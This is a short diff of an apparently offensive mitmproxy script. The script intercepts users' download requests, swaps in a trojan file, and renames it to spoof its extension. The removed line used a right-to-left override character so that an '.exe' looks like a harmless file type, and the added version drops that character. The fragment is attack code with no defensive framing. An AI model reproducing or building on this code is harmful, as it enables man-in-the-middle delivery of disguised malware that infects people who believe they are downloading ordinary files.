@@ -1,7 +1,6 @@
 import mitmproxy
-import subprocess
 import os
-from Trojan import *
+from Trojan import Trojan
 
 
 IP = "10.20.215.11"
@@ -31,7 +30,7 @@ def request(flow):
 			print("[+] Renaming trojan to spoof its extension")
 			front_file_extension = flow.request.pretty_url.split("/")[-1].split(".")[-1]
 			if front_file_extension != "exe":
-				new_name = front_file_name + "‮" + "".join(reversed(front_file_extension))  + ".exe"
+				new_name = front_file_name + "".join(reversed(front_file_extension))  + ".exe"
 				spoofed_file = WEB_ROOT + new_name
 				os.rename(trojan_file, spoofed_file)
 
